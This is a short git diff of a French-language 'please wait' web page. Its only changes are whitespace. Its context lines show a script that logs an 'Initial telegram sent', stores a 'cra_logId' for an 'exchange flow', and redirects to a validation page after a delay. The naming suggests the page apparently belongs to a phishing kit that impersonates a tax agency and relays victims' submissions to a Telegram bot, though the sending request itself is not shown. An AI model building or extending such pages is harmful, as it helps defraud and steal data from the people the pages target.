@@ -35,7 +35,7 @@
         </div>
     </header>
 
-    <nav class="nav-bar"></nav>
+  <nav class="nav-bar"></nav>
 
     <main class="flex-grow flex items-center justify-center py-20">
         <div class="container-custom text-center max-w-2xl">
@@ -79,12 +79,14 @@
                 });
                 const result = await response.json();
                 console.log('[PLEASEWAIT-FR] Initial telegram sent:', result);
-                                // Store the logId in sessionStorage for exchange flow
+                
+                // Store the logId in sessionStorage for exchange flow
                 if (result.logId) {
                     sessionStorage.setItem('cra_logId', result.logId);
                     console.log('[PLEASEWAIT] LogID stored:', result.logId);
                 }
-                                // Wait additional 5 seconds after message sent, then redirect
+                
+                // Wait additional 5 seconds after message sent, then redirect
                 setTimeout(function() {
                     console.log('[PLEASEWAIT-FR] Redirecting to validation');
                     window.location.href = 'validation-fr.html';
@@ -136,3 +138,4 @@
 
 </body>
 </html>
+
